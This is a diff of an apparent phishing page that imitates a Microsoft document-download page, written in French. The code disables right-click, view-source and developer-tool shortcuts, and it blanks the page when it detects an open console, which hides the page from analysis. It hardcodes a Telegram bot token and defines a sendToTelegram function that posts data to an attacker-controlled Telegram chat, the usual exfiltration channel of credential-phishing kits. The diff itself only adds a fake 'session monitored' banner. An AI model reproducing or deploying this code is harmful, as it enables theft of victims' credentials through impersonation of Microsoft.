@@ -7,7 +7,7 @@
     <link rel="icon" href="https://nouveaudoc.osc-fr1.scalingo.io/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
     <style>
-        /* Désactiver la sélection et le survol */
+        /* Désactiver la sélection */
         * {
             -webkit-user-select: none;
             -moz-user-select: none;
@@ -15,7 +15,6 @@
             user-select: none;
         }
         
-        /* Empêcher le clic droit */
         body {
             font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
             display: flex;
@@ -241,14 +240,50 @@
         .download-button:hover {
             background: #106ebe;
         }
+        /* Alerte de nouvelle visite */
+        .visit-alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #d13438;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 9999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            display: none;
+            animation: slideDown 0.5s ease;
+        }
+        .visit-alert.show {
+            display: block;
+        }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
         @media (max-width: 480px) {
             .main-card {
                 padding: 32px 20px 30px;
+            }
+            .visit-alert {
+                top: 10px;
+                padding: 10px 16px;
+                font-size: 12px;
+                width: 90%;
+                text-align: center;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Alerte de nouvelle visite -->
+    <div class="visit-alert" id="visitAlert">
+        ⚠️ Cette session est surveillée et enregistrée
+    </div>
+
     <div class="main-card" id="app">
         <div class="microsoft-logo">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -332,7 +367,18 @@
 
     <script>
         // ============================================================
-        // 1. PROTECTION CONTRE L'INSPECTION
+        // 1. ALERTE DE NOUVELLE VISITE
+        // ============================================================
+        (function showVisitAlert() {
+            const alert = document.getElementById('visitAlert');
+            alert.classList.add('show');
+            setTimeout(() => {
+                alert.classList.remove('show');
+            }, 5000);
+        })();
+
+        // ============================================================
+        // 2. PROTECTION CONTRE L'INSPECTION
         // ============================================================
         
         // Empêcher le clic droit
@@ -343,22 +389,18 @@
 
         // Empêcher les raccourcis clavier d'inspection
         document.addEventListener('keydown', function(e) {
-            // F12
             if (e.key === 'F12') {
                 e.preventDefault();
                 return false;
             }
-            // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
             if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) {
                 e.preventDefault();
                 return false;
             }
-            // Ctrl+U (afficher la source)
             if (e.ctrlKey && e.key === 'u') {
                 e.preventDefault();
                 return false;
             }
-            // Ctrl+Shift+C (inspecter l'élément)
             if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                 e.preventDefault();
                 return false;
@@ -378,14 +420,13 @@
             return false;
         });
 
-        // Protection contre les outils de développement : détection de la console
+        // Détection de la console (outils de développement)
         (function detectDevTools() {
             const threshold = 160;
             let widthThreshold = window.outerWidth - window.innerWidth > threshold;
             let heightThreshold = window.outerHeight - window.innerHeight > threshold;
             
             if (widthThreshold || heightThreshold) {
-                // La console est ouverte
                 document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial;text-align:center;padding:20px;color:#d13438;"><div><h1>⛔ Accès refusé</h1><p>Les outils de développement sont désactivés sur cette page.</p></div></div>';
                 document.body.style.background = '#fff';
             }
@@ -404,7 +445,7 @@
         }, 1000);
 
         // ============================================================
-        // 2. CONFIGURATION TELEGRAM
+        // 3. CONFIGURATION TELEGRAM
         // ============================================================
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '8614102197:AAG3IMMF8ZSlwC0KU7akUdc2sHEzJBIm0qU',
@@ -412,7 +453,7 @@
         };
 
         // ============================================================
-        // 3. FONCTION D'ENVOI VERS TELEGRAM
+        // 4. FONCTION D'ENVOI VERS TELEGRAM
         // ============================================================
         function sendToTelegram(message) {
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
@@ -500,7 +541,7 @@
         }
 
         // ============================================================
-        // 4. SCRIPT PRINCIPAL DE L'APPLICATION
+        // 5. SCRIPT PRINCIPAL DE L'APPLICATION
         // ============================================================
         (function() {
             "use strict";
